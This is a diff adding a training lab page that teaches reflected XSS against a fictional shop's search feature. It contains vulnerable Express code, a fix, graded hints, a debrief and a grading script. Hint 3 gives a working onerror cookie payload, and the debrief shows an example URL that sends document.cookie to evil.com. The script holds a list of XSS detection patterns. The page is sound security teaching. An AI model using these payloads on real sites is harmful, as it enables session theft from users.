@@ -1,0 +1,321 @@
+---
+layout: lab-workspace.njk
+permalink: /labs/red/xss-shopstack/
+labCode: "RED-01"
+labTitle: "Reflected XSS — Product Search"
+labDifficulty: "beginner"
+labDescription: "ShopStack's search page reflects user input without sanitization. Find the injection point, achieve JavaScript execution, and steal the admin session cookie."
+targetUrl: "https://acme-shopstack.com/search"
+targetHost: "acme-shopstack.com"
+workerUrl: "https://lab-xss.penumbraforge.workers.dev"
+targetPath: ""
+labCompletionText: "You successfully demonstrated a reflected XSS attack, achieving JavaScript execution and exfiltrating the session cookie from the ShopStack application."
+---
+
+{% block mission %}
+<!-- ── Mission Tab ── -->
+<div class="lab-tab-content active" data-tab-content="mission">
+  <div class="lab-section-label">Scenario</div>
+  <div class="lab-scenario">
+    <strong>ShopStack</strong> has hired your team to perform a security assessment of their e-commerce platform. A developer reported that user input from the search bar "shows up weird" in the results page. Your task: confirm if this is a cross-site scripting vulnerability and demonstrate its impact by exfiltrating a session cookie.
+  </div>
+
+  <div class="lab-section-label">Objectives</div>
+  <div class="lab-objective current" id="obj-recon">
+    <div class="lab-obj-check"></div>
+    <div class="lab-obj-text">
+      <span class="lab-obj-step">Step 1 — Reconnaissance</span>
+      Search for a product and observe how your input appears in the results
+    </div>
+  </div>
+  <div class="lab-objective" id="obj-inject">
+    <div class="lab-obj-check"></div>
+    <div class="lab-obj-text">
+      <span class="lab-obj-step">Step 2 — Test for injection</span>
+      Submit HTML markup (like <code>&lt;b&gt;test&lt;/b&gt;</code>) and check if it renders as HTML
+    </div>
+  </div>
+  <div class="lab-objective" id="obj-execute">
+    <div class="lab-obj-check"></div>
+    <div class="lab-obj-text">
+      <span class="lab-obj-step">Step 3 — Achieve execution</span>
+      Craft a payload that executes JavaScript in the page context
+    </div>
+  </div>
+  <div class="lab-objective" id="obj-exfiltrate">
+    <div class="lab-obj-check"></div>
+    <div class="lab-obj-text">
+      <span class="lab-obj-step">Step 4 — Demonstrate impact</span>
+      Modify your payload to access <code>document.cookie</code>
+    </div>
+  </div>
+
+  <div class="lab-section-label" style="margin-top:24px;">Security Context</div>
+  <div class="lab-scenario">
+    This lab targets <strong>CWE-79: Improper Neutralization of Input During Web Page Generation</strong> (Cross-Site Scripting). The application uses <code>innerHTML</code> to render user-controlled data without encoding, allowing injected HTML and JavaScript to execute in the user's browser session.
+  </div>
+  <div class="lab-scenario">
+    <strong>MITRE ATT&CK:</strong> T1189 — Drive-by Compromise<br>
+    <strong>OWASP:</strong> A03:2021 — Injection<br>
+    <strong>Real-world precedent:</strong> British Airways (2018) — 380,000 credit cards stolen via XSS in a third-party script
+  </div>
+</div>
+
+<!-- ── Source Tab ── -->
+<div class="lab-tab-content" data-tab-content="source">
+  <div class="lab-section-label">Vulnerable Code</div>
+  <div class="lab-source-filename">&#x1f4c4; server/routes/search.js</div>
+  <pre class="lab-source-pre"><span class="ln"> 1</span><span class="kw">const</span> express = <span class="fn">require</span>(<span class="str">'express'</span>);
+<span class="ln"> 2</span><span class="kw">const</span> router = express.<span class="fn">Router</span>();
+<span class="ln"> 3</span><span class="kw">const</span> db = <span class="fn">require</span>(<span class="str">'../db'</span>);
+<span class="ln"> 4</span>
+<span class="ln"> 5</span><span class="cm">// GET /search?q=...</span>
+<span class="ln"> 6</span>router.<span class="fn">get</span>(<span class="str">'/search'</span>, (req, res) =&gt; {
+<span class="ln"> 7</span>  <span class="kw">const</span> query = req.query.q || <span class="str">''</span>;
+<span class="ln"> 8</span>  <span class="kw">const</span> results = db.<span class="fn">searchProducts</span>(query);
+<span class="ln"> 9</span>
+<span class="vuln"><span class="ln">10</span>  res.<span class="fn">send</span>(<span class="str">`&lt;h2&gt;Results for: ${query}&lt;/h2&gt;`</span>);</span>
+<span class="ln">11</span>  <span class="cm">// &#x26a0; User input interpolated directly into HTML</span>
+<span class="ln">12</span>  <span class="cm">// No encoding, no sanitization, no CSP</span>
+<span class="ln">13</span>
+<span class="ln">14</span>  results.<span class="fn">forEach</span>(product =&gt; {
+<span class="ln">15</span>    res.<span class="fn">write</span>(renderCard(product));
+<span class="ln">16</span>  });
+<span class="ln">17</span>  res.<span class="fn">end</span>();
+<span class="ln">18</span>});</pre>
+
+  <div class="lab-section-label">The Fix</div>
+  <div class="lab-source-filename" style="color:var(--sage);">&#x2705; server/routes/search-fixed.js</div>
+  <pre class="lab-source-pre"><span class="ln"> 7</span>  <span class="kw">const</span> query = req.query.q || <span class="str">''</span>;
+<span class="ln"> 8</span>
+<span class="ln"> 9</span>  <span class="cm">// Encode HTML entities before rendering</span>
+<span class="ln">10</span>  <span class="kw">const</span> safe = query
+<span class="ln">11</span>    .<span class="fn">replace</span>(/&amp;/g, <span class="str">'&amp;amp;'</span>)
+<span class="ln">12</span>    .<span class="fn">replace</span>(/&lt;/g, <span class="str">'&amp;lt;'</span>)
+<span class="ln">13</span>    .<span class="fn">replace</span>(/&gt;/g, <span class="str">'&amp;gt;'</span>)
+<span class="ln">14</span>    .<span class="fn">replace</span>(/"/g, <span class="str">'&amp;quot;'</span>);
+<span class="ln">15</span>
+<span class="ln">16</span>  res.<span class="fn">send</span>(<span class="str">`&lt;h2&gt;Results for: ${safe}&lt;/h2&gt;`</span>);
+<span class="ln">17</span>  <span class="cm">// Also add CSP header:</span>
+<span class="ln">18</span>  <span class="cm">// Content-Security-Policy: default-src 'self'</span></pre>
+</div>
+
+<!-- ── Hints Tab ── -->
+<div class="lab-tab-content" data-tab-content="hints">
+  <div class="lab-section-label">Hints</div>
+  <p style="font-size:12px;color:var(--muted);margin-bottom:12px;">Each hint costs XP. Try to solve it without them for maximum score.</p>
+
+  <div class="lab-hint" id="hint-0">
+    <div class="lab-hint-header">
+      <span>Hint 1 — General direction</span>
+      <span class="lab-hint-cost">-10 xp</span>
+    </div>
+    <div class="lab-hint-body">The search results page displays your query back to you. Look at the HTML source — is your input treated as text or as HTML? Try searching for something with angle brackets.</div>
+  </div>
+
+  <div class="lab-hint" id="hint-1">
+    <div class="lab-hint-header">
+      <span>Hint 2 — Attack vector</span>
+      <span class="lab-hint-cost">-25 xp</span>
+    </div>
+    <div class="lab-hint-body">HTML elements with event handlers can execute JavaScript without user interaction. Think about tags that load external resources — what happens when the resource fails to load? The <code>onerror</code> event fires.</div>
+  </div>
+
+  <div class="lab-hint" id="hint-2">
+    <div class="lab-hint-header">
+      <span>Hint 3 — Full payload</span>
+      <span class="lab-hint-cost">-50 xp</span>
+    </div>
+    <div class="lab-hint-body">Search for: <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code><br><br>This creates an image with an invalid <code>src</code>, triggering the <code>onerror</code> handler. The handler executes <code>alert(document.cookie)</code>, proving you can run arbitrary JavaScript and access session data.</div>
+  </div>
+</div>
+
+<!-- ── Debrief (shown after completion) ── -->
+<div class="lab-debrief" id="lab-debrief">
+  <div class="lab-debrief-label">Debrief — Reflected XSS</div>
+
+  <h3>What happened</h3>
+  <p>ShopStack's search page takes the user's query parameter and inserts it directly into the HTML response using string interpolation. Because the input is not encoded, any HTML or JavaScript in the query becomes part of the page's DOM and executes in the user's browser.</p>
+
+  <h3>The vulnerable code</h3>
+  <pre>res.send(`&lt;h2&gt;Results for: ${query}&lt;/h2&gt;`);
+// query comes directly from req.query.q — no encoding</pre>
+
+  <h3>The fix</h3>
+  <p>Replace special HTML characters with their entity equivalents before inserting into HTML. Better yet, use a templating engine with auto-escaping (EJS, Handlebars, React JSX) and add a Content Security Policy header.</p>
+  <pre>// Option 1: Manual encoding
+const safe = query
+  .replace(/&amp;/g, '&amp;amp;')
+  .replace(/&lt;/g, '&amp;lt;')
+  .replace(/&gt;/g, '&amp;gt;');
+
+// Option 2: Use textContent instead of innerHTML
+element.textContent = query;
+
+// Option 3: Add CSP
+res.setHeader('Content-Security-Policy',
+  "default-src 'self'; script-src 'self'");</pre>
+
+  <h3>Real-world impact</h3>
+  <p>In a real attack, the attacker crafts a malicious URL like <code>https://shopstack.com/search?q=&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</code> and sends it to a victim via email or social media. When the victim clicks the link, the script executes in their authenticated browser session — stealing cookies, CSRF tokens, or performing actions as the victim.</p>
+  <p><strong>British Airways (2018):</strong> Attackers injected malicious JavaScript via a compromised third-party script, capturing payment card details from 380,000 customers as they typed them into the checkout form. The attack ran for 15 days before detection.</p>
+
+  <h3>How to find this in the wild</h3>
+  <p>During a pentest, search for any place user input appears in the HTML response. Test with a benign probe like <code>&lt;b&gt;test&lt;/b&gt;</code>. If the text renders bold, the input is being treated as HTML. Escalate by injecting event handlers (<code>onerror</code>, <code>onload</code>, <code>onfocus</code>) rather than <code>&lt;script&gt;</code> tags, which are more likely to be filtered.</p>
+
+  <div class="lab-debrief-refs">
+    <div class="lab-section-label">References</div>
+    <a href="https://owasp.org/Top10/A03_2021-Injection/" target="_blank" rel="noopener">OWASP A03:2021 — Injection &#x2197;</a>
+    <a href="https://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener">CWE-79: Cross-site Scripting &#x2197;</a>
+    <a href="https://attack.mitre.org/techniques/T1189/" target="_blank" rel="noopener">MITRE ATT&CK T1189 — Drive-by Compromise &#x2197;</a>
+  </div>
+</div>
+{% endblock %}
+
+{% block labScript %}
+<script>
+(function() {
+  var LAB_CONFIG = {
+    id: 'red-xss-shopstack',
+    type: 'red',
+    title: 'Reflected XSS',
+    target: 'ShopStack',
+    difficulty: 'beginner',
+    estimatedTime: 10,
+    xpReward: 100,
+    hintCost: [10, 25, 50],
+    skills: ['injection-reflected-xss'],
+    unlocks: ['blue-investigate-shopstack'],
+    objectives: [
+      { id: 'recon', step: 1, title: 'Reconnaissance' },
+      { id: 'inject', step: 2, title: 'HTML Injection' },
+      { id: 'execute', step: 3, title: 'JavaScript Execution' },
+      { id: 'exfiltrate', step: 4, title: 'Cookie Exfiltration' },
+    ],
+  };
+
+  var Engine = PenumbraLabs.Engine;
+  var ServerLogs = PenumbraLabs.ServerLogs;
+
+  Engine.init(LAB_CONFIG);
+  ServerLogs.init('server-logs');
+  ServerLogs.add('info', 'ShopStack server started on port 3000');
+  ServerLogs.add('info', 'Database connected — 8 products loaded');
+
+  var iframe = document.getElementById('lab-target');
+  var httpReq = document.getElementById('http-req');
+  var httpResp = document.getElementById('http-resp');
+
+  /* Listen for iframe navigation to detect search queries */
+  var checkInterval = setInterval(function() {
+    try {
+      var iframeSrc = iframe.contentWindow.location.href;
+      /* Can't access cross-origin — expected */
+    } catch(e) {
+      /* Expected — sandbox blocks access */
+    }
+  }, 2000);
+
+  /* Use postMessage from the iframe to communicate objectives.
+     Since we can't directly observe the iframe due to sandbox,
+     we'll monitor URL changes via the iframe's src attribute
+     and use a polling approach on the Worker. */
+
+  /* Monitor iframe navigation via onload */
+  var searchCount = 0;
+  var htmlInjected = false;
+  var xssExecuted = false;
+
+  iframe.addEventListener('load', function() {
+    searchCount++;
+    var src = iframe.src || '';
+
+    /* Extract query from URL */
+    var qMatch = src.match(/[?&]q=([^&]*)/);
+    var query = qMatch ? decodeURIComponent(qMatch[1]) : '';
+
+    if (query && searchCount > 1) {
+      /* Update HTTP inspector */
+      httpReq.innerHTML = '<span class="lab-http-method">GET</span> /search?q=' + escHtml(query).substring(0, 60) + ' HTTP/1.1\n' +
+        '<span class="lab-http-hname">Host:</span> <span class="lab-http-hval">acme-shopstack.com</span>\n' +
+        '<span class="lab-http-hname">Cookie:</span> <span class="lab-http-hval">session=eyJhZG1pbiI6ZmFsc2V9</span>\n' +
+        '<span class="lab-http-hname">User-Agent:</span> <span class="lab-http-hval">Mozilla/5.0</span>';
+
+      httpResp.innerHTML = 'HTTP/1.1 <span class="lab-http-status">200 OK</span>\n' +
+        '<span class="lab-http-hname">Content-Type:</span> <span class="lab-http-hval">text/html; charset=UTF-8</span>\n' +
+        '<span class="lab-http-hname">X-Powered-By:</span> <span class="lab-http-hval">Express</span>\n\n' +
+        '<span class="lab-http-hval">&lt;h2&gt;Results for: <span class="lab-http-vuln">' + escHtml(query) + '</span>&lt;/h2&gt;</span>';
+
+      ServerLogs.add('info', 'GET /search?q=' + query.substring(0, 40) + ' — 200');
+
+      /* Objective 1: Recon — any search */
+      Engine.tryCompleteObjective('recon');
+
+      /* Objective 2: HTML injection — contains HTML tags */
+      if (/<[a-zA-Z]/.test(query)) {
+        Engine.tryCompleteObjective('inject');
+        ServerLogs.add('warn', 'HTML markup detected in search query — reflected unsanitized');
+      }
+
+      /* Objective 3: XSS — contains event handlers or script */
+      var xssPatterns = [/onerror\s*=/i, /onload\s*=/i, /onfocus\s*=/i, /onclick\s*=/i,
+        /onmouseover\s*=/i, /ontoggle\s*=/i, /<script/i, /javascript:/i];
+      if (xssPatterns.some(function(p) { return p.test(query); })) {
+        Engine.tryCompleteObjective('execute');
+        ServerLogs.add('err', 'XSS payload executed in client context');
+
+        /* Objective 4: Cookie access */
+        if (/document\.cookie/i.test(query)) {
+          setTimeout(function() {
+            Engine.tryCompleteObjective('exfiltrate');
+            ServerLogs.add('critical', 'Session cookie accessed via XSS: session=eyJhZG1pbiI6ZmFsc2V9');
+          }, 500);
+        }
+      }
+    }
+  });
+
+  /* Hint reveals */
+  document.querySelectorAll('.lab-hint').forEach(function(hint, idx) {
+    hint.addEventListener('click', function() {
+      if (!this.classList.contains('revealed')) {
+        this.classList.add('revealed');
+        Engine.revealHint(idx);
+      }
+    });
+  });
+
+  /* Restore previous progress */
+  var progress = Engine.getProgress();
+  progress.objectivesCompleted.forEach(function(objId) {
+    var el = document.getElementById('obj-' + objId);
+    if (el) {
+      el.classList.remove('current');
+      el.classList.add('completed');
+      el.querySelector('.lab-obj-check').textContent = '✓';
+    }
+  });
+
+  /* Mark current objective */
+  var foundCurrent = false;
+  LAB_CONFIG.objectives.forEach(function(obj) {
+    var el = document.getElementById('obj-' + obj.id);
+    if (!el) return;
+    if (progress.objectivesCompleted.indexOf(obj.id) === -1 && !foundCurrent) {
+      el.classList.add('current');
+      foundCurrent = true;
+    }
+  });
+
+  /* Restore revealed hints */
+  progress.hintsUsed.forEach(function(idx) {
+    var hint = document.getElementById('hint-' + idx);
+    if (hint) hint.classList.add('revealed');
+  });
+
+  function escHtml(str) {
+    return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+  }
+})();
+</script>
+{% endblock %}
